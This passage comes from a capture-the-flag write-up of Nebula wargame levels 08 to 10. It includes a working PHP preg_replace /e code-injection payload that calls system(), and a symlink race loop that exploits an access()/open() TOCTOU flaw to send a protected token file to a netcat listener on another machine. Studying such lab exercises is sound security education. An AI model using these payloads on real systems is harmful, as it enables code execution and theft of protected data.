<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ ssh flag08@localhost
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag08@localhost's password: 
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag08@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 09</h3>

<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>

<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>

<ul>
<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
</ul>


<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>

<ul>
<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
</ul>


<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>

<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
be escaped by backslashes in substituted backreferences.</p></blockquote>

<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>

<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>

<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/test
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>nothing to see here</span></code></pre></td></tr></table></div></figure>


<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>

<p>First of all, the line that facilitates the exploitation is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>haxor@hack.com becomes haxor AT hack dot com</span></code></pre></td></tr></table></div></figure>


<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email haxor@hack.com]</span></code></pre></td></tr></table></div></figure>


<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</span></code></pre></td></tr></table></div></figure>


<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{${eval()}}</span></code></pre></td></tr></table></div></figure>


<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email {${system()}}]</span></code></pre></td></tr></table></div></figure>


<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>

<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>

<ul>
<li><p>we want to run <em>getflag</em></p></li>
<li><p>we can run external commands in PHP with <em>system()</em></p></li>
<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
<li><p>we have to put the exploit into a file to be read by the binary</p></li>
</ul>


<p>With all these requirements in mind, I created a file with the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ cat /tmp/useme
</span><span class='line'>[email {${system($use_me)}}]</span></code></pre></td></tr></table></div></figure>


<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span></code></pre></td></tr></table></div></figure>


<p>Pff, this was a difficult level, but really interesting and I learned something!</p>

<h3>Level 10</h3>

<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>

<p>To do this level, log in as the level10 account with the password level10 . Files for this level can be found in /home/flag10.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'> <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'> <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">#undef HITHERE</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>

<ul>
<li><em>int access(const char </em>pathname, int mode);*</li>
</ul>


<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>

<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
reason, the use of this system call should be avoided.</p></blockquote>

<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>

<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
</span><span class='line'>Connecting to 192.168.80.130:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!</span></code></pre></td></tr></table></div></figure>


<p>And on my netcat side:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
</span><span class='line'>.oO Oo.
</span><span class='line'>blabla</span></code></pre></td></tr></table></div></figure>


<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>

<ul>
<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# while true; do nc -nlp 18211; done</span></code></pre></td></tr></table></div></figure>


<ul>
<li>on the Nebula machine, I ran this command:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do touch /tmp/tok & ./flag10 /tmp/tok 192.168.80.130 & ln -fs /home/flag10/token /tmp/tok & rm -f /tmp/tok; done</span></code></pre></td></tr></table></div></figure>


<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>

<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>

<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done</span></code></pre></td></tr></table></div></figure>


<p>And in the other:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done</span></code></pre></td></tr></table></div></figure>


<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>

<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag10@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
